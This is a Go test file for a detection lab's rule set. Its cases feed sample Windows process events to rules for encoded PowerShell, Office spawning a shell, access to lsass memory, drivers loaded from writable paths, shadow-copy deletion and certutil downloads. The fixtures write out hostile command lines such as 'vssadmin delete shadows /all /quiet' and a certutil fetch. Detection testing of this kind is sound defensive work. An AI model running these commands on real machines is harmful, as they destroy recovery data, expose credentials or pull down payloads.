package rules

import (
	"testing"

	"github.com/vynak/detection-lab/internal/model"
)

func firedIDs(event model.Event) map[string]bool {
	ids := map[string]bool{}
	for _, alert := range Evaluate(event, All()) {
		ids[alert.RuleID] = true
	}
	return ids
}

func TestEncodedPowerShell(t *testing.T) {
	cases := []struct {
		name    string
		command string
		want    bool
	}{
		{"short flag", `powershell.exe -nop -w hidden -enc SQBFAFgA`, true},
		{"long flag", `powershell.exe -NoProfile -EncodedCommand SQBFAFgA`, true},
		{"plain file", `powershell.exe -NoProfile -File C:\Scripts\inventory.ps1`, false},
		{"other flag", `powershell.exe -ExecutionPolicy Bypass -File x.ps1`, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			event := model.Event{
				Kind:        "process_start",
				Image:       `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
				CommandLine: tc.command,
			}
			if got := firedIDs(event)["LAB-001"]; got != tc.want {
				t.Errorf("LAB-001 fired=%v, want %v", got, tc.want)
			}
		})
	}
}

func TestOfficeSpawnsShell(t *testing.T) {
	event := model.Event{
		Kind:        "process_start",
		Image:       `C:\Windows\System32\cmd.exe`,
		ParentImage: `C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE`,
	}
	if !firedIDs(event)["LAB-002"] {
		t.Error("LAB-002 should fire when Word spawns cmd")
	}

	benign := model.Event{
		Kind:        "process_start",
		Image:       `C:\Windows\System32\cmd.exe`,
		ParentImage: `C:\Windows\explorer.exe`,
	}
	if firedIDs(benign)["LAB-002"] {
		t.Error("LAB-002 should not fire for explorer")
	}
}

func TestLSASAccessIgnoresSystemProcesses(t *testing.T) {
	malicious := model.Event{Kind: "process_access", Image: `C:\Tools\procdump64.exe`, Target: `C:\Windows\System32\lsass.exe`}
	if !firedIDs(malicious)["LAB-003"] {
		t.Error("LAB-003 should fire for procdump")
	}

	system := model.Event{Kind: "process_access", Image: `C:\Windows\System32\svchost.exe`, Target: `C:\Windows\System32\lsass.exe`}
	if firedIDs(system)["LAB-003"] {
		t.Error("LAB-003 should not fire for svchost")
	}
}

func TestDriverFromWritablePath(t *testing.T) {
	temp := model.Event{Kind: "driver_load", Image: `C:\Users\a.gomez\AppData\Local\Temp\kdm.sys`}
	if !firedIDs(temp)["LAB-004"] {
		t.Error("LAB-004 should fire for a driver in the user temp directory")
	}

	system := model.Event{Kind: "driver_load", Image: `C:\Windows\System32\drivers\ndis.sys`}
	if firedIDs(system)["LAB-004"] {
		t.Error("LAB-004 should not fire inside System32")
	}
}

func TestDriverUnsignedFiresEvenInSystem32(t *testing.T) {
	no := false
	event := model.Event{Kind: "driver_load", Image: `C:\Windows\System32\drivers\odd.sys`, Signed: &no}

	if !firedIDs(event)["LAB-004"] {
		t.Error("LAB-004 should fire for an unsigned driver")
	}
}

func TestShadowCopyDeletion(t *testing.T) {
	cases := map[string]bool{
		`vssadmin delete shadows /all /quiet`:         true,
		`vssadmin.exe delete shadows /for=C: /oldest`: true,
		`wmic shadowcopy delete`:                      true,
		`vssadmin list shadows`:                       false,
		`cmd.exe /c ipconfig /all`:                    false,
	}
	for command, want := range cases {
		event := model.Event{Kind: "process_start", Image: `C:\Windows\System32\vssadmin.exe`, CommandLine: command}
		if got := firedIDs(event)["LAB-005"]; got != want {
			t.Errorf("%q: LAB-005 fired=%v, want %v", command, got, want)
		}
	}
}

func TestCertutilDownload(t *testing.T) {
	cases := map[string]bool{
		`certutil.exe -urlcache -split -f http://example.com/a.bin a.bin`: true,
		`certutil -verifyctl -f http://example.com/a.bin`:                 true,
		`certutil -hashfile C:\Temp\file.bin SHA256`:                      false,
	}
	for command, want := range cases {
		event := model.Event{Kind: "process_start", Image: `C:\Windows\System32\certutil.exe`, CommandLine: command}
		if got := firedIDs(event)["LAB-006"]; got != want {
			t.Errorf("%q: LAB-006 fired=%v, want %v", command, got, want)
		}
	}
}

func TestRulesCoverEveryKindAndHaveMetadata(t *testing.T) {
	for _, rule := range All() {
		if rule.ID == "" || rule.Title == "" || rule.Severity == "" || rule.Technique == "" {
			t.Errorf("rule %+v is missing metadata", rule)
		}
		if rule.Match == nil {
			t.Errorf("rule %s has no Match function", rule.ID)
		}
	}
}
